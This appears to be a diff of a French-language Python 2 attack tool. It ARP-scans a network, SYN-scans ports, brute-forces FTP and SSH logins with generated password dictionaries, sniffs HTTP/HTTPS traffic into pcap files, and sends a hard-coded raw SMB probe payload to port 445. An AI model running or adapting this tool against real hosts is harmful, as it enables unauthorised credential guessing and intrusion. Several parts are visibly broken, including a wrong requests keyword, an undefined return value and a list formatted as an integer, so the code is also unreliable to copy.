@@ -57,7 +57,7 @@ def factorisation(length):
 	if length == 1: return length
 	return factorisation(length-1)*length
 
-def pwd_aplha(lgr, mode):
+def pwd_alpha(lgr, mode):
 	if mode == 'alpha':
 		return ''.join(ascii_lowercase[randint(0,len(ascii_lowercase)-1)] for i in range(int(lgr)))
 	elif mode == 'digits':
@@ -68,24 +68,23 @@ def pwd_aplha(lgr, mode):
 def generate(mode, lgr):
 	stop = False
 	if mode == 'alpha':
-		len_mode = factorisation(ascii_lowercase)
+		len_mode = factorisation(len(ascii_lowercase))
 	elif mode == 'digits':
-		len_mode = factorisation(digits)
+		len_mode = factorisation(len(digits))
 	else:
-		len_mode = factorisation(big)
+		len_mode = factorisation(len(big))
 	try:
-		sys.stdout.write('\n\033[94m[+]\033[0m Création aléatoire du Dictionnaire en cours...\n')
 		while stop != True:
-			psswd = pwd_alpha(lgr,mode)
+			psswd = pwd_alpha(lgr, mode)
 			if psswd not in pwd: pwd.append(psswd)
-			sys.stdout.write('\r\033[94m[+]\033[0m Fulfilling the dictionnary : ' +
+			sys.stdout.write('\r\033[96m[+]\033[0m Remplissage du dictionnaire [/!\\ en mémoire] : ' +
 					 str(len(pwd)) + ' / '+ str(len_mode))
 			sys.stdout.flush()
 			if len(pwd) == len_mode:
 				stop = True
 				sys.stdout.write('\n\033[94m[+]\033[0m Dictionnaire généré.\n')
 	except KeyboardInterrupt:
-		sys.stdout.write('\n\033[94m[+]\033[0m Génération interrompue avec succès. Longueur : %d.\n' % len(pwd))
+		sys.stdout.write('\n\033[94m[+]\033[0m Génération interrompue avec succès. Longueur : %d.\n\n' % len(pwd))
 		return pwd
 	return pwd
 
@@ -119,17 +118,11 @@ def ssh_conn(log, addr, passwd):
 def query(port, dst):
 	url 	= dst + ':' + port
 	cookie	= {'spip_session':pwd_alpha(16, 'alpha')}
-	headers = {'content-type': 'application/json'}
+	headers = {'content-type':'application/json'}
 	def upload_pkt(packet):
     		r = requests.get(url, headers=headers, cookie=cookie)
  	return uploaded_pkt
 
-def smb_query(dest):
-	payload = "\x00\x00\x001\xffSMB+\x00\x00\x00\x00\x18C\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe\x00\x00\xfe\xff\x01\x01\x00\x0c\x00JlJmIhClBsr\x00"
-	def smb_pkt(packet):
-		send(IP(dst=dest)/TCP(dport=445)/Raw=payload)
-	return smb_pkt
-	
 def long2net(arg):
 	if (arg <= 0 or arg >= 0xFFFFFFFF):
 		raise ValueError("\033[91m[-]\033[0m Valeur du masque illégale.", hex(arg))
@@ -146,7 +139,7 @@ def to_CIDR_notation(bytes_network, bytes_netmask):
 
 def scan_and_print_neighbors(net, interface, timeout=1):
 	global ips_o
-	logger.info("\033[94m[+]\033[0m ARP %s sur %s" % (net, interface))
+	print "\033[94m[+]\033[0m ARP %s sur %s" % (net, interface)
 	try:
 		ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
 		for s, r in ans.res:
@@ -160,7 +153,7 @@ def scan_and_print_neighbors(net, interface, timeout=1):
 			except KeyboardInterrupt:
 				print '\033[91m[-]\033[0m L\'utilisateur a choisi l\'interruption du process.'
 				break
-			logger.info("\033[92m[*]\033[0m " + line)
+			logger.error("\033[92m[*]\033[0m " + line)
 	except socket.error as e:
 		if e.errno == errno.EPERM:
 			logger.error("\033[91m[-]\033[0m %s. Vous n'etes pas root?", e.strerror)
@@ -184,9 +177,9 @@ def checkhost(ip):
 	global ips_o
 	conf.verb = 0
 	try:
-		ping, no = sr(IP(dst=ip)/ICMP(), timeout=2)
+		ping, no = sr(IP(dst=ip)/ICMP(), timeout=1.5, retry=-2)
 		if ping.res:
-			print "\033[94m[+]\033[0m La cible est en ligne :", ip
+			logger.info("\033[96m[+]\033[0m La cible est en ligne : " + ip)
 			ips_o.append(ip)
         except socket.error as e:
                 if e.errno == errno.EPERM:
@@ -215,7 +208,7 @@ def scanner(target):
         		SYNACKpkt = sr1(IP(dst = target)/TCP(sport = srcport, dport = port, flags = "S"), timeout=2)
         		pktflags = SYNACKpkt.getlayer(TCP).flags
         		if pktflags == SYNACK:
-				print '\033[94m[+]\033[0m Port Ouvert :', port, 'sur la cible --> ', target
+				print '\033[96m[+]\033[0m Port Ouvert :', port, 'sur la cible --> ', target
 				ports_i.append(port)
 	 		else:
 	        		RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
@@ -257,7 +250,7 @@ def port_scan(ip):
 			thr.join()
 	else:
 		sys.exit('\n\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
-	print '\n\033[94m[+]\033[0m Résumé du scan de ports:\n', online
+	print '\n\033[92m[*]\033[0m Résumé du scan de ports:\n{}'.format(online)
 
 def get_ip():
 	try:
@@ -392,10 +385,10 @@ if __name__ == '__main__':
 				print '\033[91m[-]\033[0m une erreur est survenue: Ouverture de la wordlist.'
 				sys.exit(-1)
 		else:
-			print "\n\033[92m[*]\033[0m Mode:", args.mode[0]
+			print "\n\033[92m[*]\033[0m Mode:", args.mode
 			print "\033[94m[+]\033[0m Generation du dictionnaire (100.000 elements max)."
 			print "\033[92m[*]\033[0m Longueur des lignes:", args.longueur[0]
-			print "\033[92m[*]\033[0m Pour interrompre le processus et poursuivre les tests -> [CTRL+C]"
+			print "\033[92m[*]\033[0m Pour interrompre le processus et poursuivre les tests -> [CTRL+C]\n"
 			dic = generate(args.mode[0], args.longueur[0])
 		
 	if online is not None:
@@ -403,7 +396,7 @@ if __name__ == '__main__':
 		for host in online:
 # FTP ----------------------------------------------------------------------------------------------------------
 			if 21 in online[host]:
-				print "\033[94m[+]\033[0m Cible avec FTP ouvert : %s." % host
+				print "\033[33m[+]\033[0m Cible avec FTP ouvert : %s." % host
 				try:
 					threads = []
 					for item in dic:
@@ -417,13 +410,13 @@ if __name__ == '__main__':
 					for thr in threads:
 						thr.join()
 				except KeyboardInterrupt:
-					print '\n\n[*] Nbr d\'essais '+ str(idx)
+					print '\n[*] Nbr d\'essais '+ str(idx)
 					idx = 0
 				except Exception as e:
 					logger.error("\033[91m[-]\033[0m %s", e.strerror)
 # SSH ----------------------------------------------------------------------------------------------------------
 			if 22 in online[host]:
-				print "\033[94m[+]\033[0m Cible avec SSH ouvert : %s." % host
+				print "\033[31m[+]\033[0m Cible avec SSH ouvert : %s." % host
 				try:
 					threads = []
 					for psswd in dic:
@@ -444,29 +437,40 @@ if __name__ == '__main__':
 # HTTP ---------------------------------------------------------------------------------------------------------
 			if 80 in online[host] or 8000 in online[host] or 8080 in online[host]:
 				port_idx = [i for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
-				print "\033[94m[+]\033[0m Sniffing -> Cible avec HTTP ouvert : %s sur le port %d." % (host, port_idx)
+				print "\033[35m[+]\033[0m Sniffing -> Cible avec HTTP ouvert : %s sur le port %d." % (host, port_idx)
 				sniffed = sniff(prn=query(online[host][port_idx], host), 
 						filter="tcp and port " + 
 						str(online[host][port_idx]) + " and host " + host, 
 						count=25)
-				logger.info('\033[92m[*]\033[0m Sommaire --------\n{}'.format(sniffed.summary()))
-				wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
+				sniffed.nsummary()
+				try:
+					wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
+				except:
+					pass
 # HTTPS --------------------------------------------------------------------------------------------------------
 			if 443 in online[host]:
-				print "\033[94m[+]\033[0m Sniffing -> Cible avec HTTPS ouvert : %s." % host
+				print "\033[1m[+]\033[0m Sniffing -> Cible avec HTTPS ouvert : %s." % host
 				sniffed = sniff(prn=query(443, host), 
 						filter="tcp and port 443 and host " + host, 
 						count=25)
-				logger.info('\033[92m[*]\033[0m Sommaire --------\n{}'.format(sniffed.summary()))
-				wrpcap('HTTPS-' + host + '-filtered.pcap', sniffed, append=True)
+				sniffed.nsummary()
+				try:
+					wrpcap('HTTPS-' + host + '-filtered.pcap', sniffed, append=True)
+				except:
+					pass
 # SMB ----------------------------------------------------------------------------------------------------------
 			if 445 in online[host]:
-				print "\033[94m[+]\033[0m Sniffing -> Cible avec SMB ouvert : %s." % host
-				sniffed = sniff(prn=smb_query(host),
-						filter="port 445 and host " + host, 
-						count=25)
-				logger.info('\033[92m[*]\033[0m Sommaire --------\n{}'.format(sniffed.summary()))
-				wrpcap('SMB-' + host + '-filtered.pcap', sniffed, append=True)
-		sys.exit('\n\033[94m[+]\033[0m # Job done #\n')
+				print "\033[36m[+]\033[0m Sniffing -> Cible avec SMB ouvert : %s." % host
+				payload = "\x00\x00\x001\xffSMB+\x00\x00\x00\x00\x18C\xc0"+\
+                                          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"+\
+                                          "\x00\x00\xfe\xff\x01\x01\x00\x0c\x00JlJmIhClBsr\x00"
+                                packet = IP(dst=host)/TCP(dport=445)/Raw(load=payload)
+                                sniffed, unans = sr(packet, timeout=1.5, verbose=0, multi=True)
+				sniffed.nsummary()
+				try:
+					wrpcap('SMB-' + host + '-filtered.pcap', sniffed, append=True)
+				except:
+					pass
+		sys.exit('\n\033[91m[+]\033[0m # Job done #\n')
 	else:
 		sys.exit('\033[91m[-]\033[0m Afin de poursuivre l\'analyse, vous devez mentionner un mode (wordlist / mode de bf).')
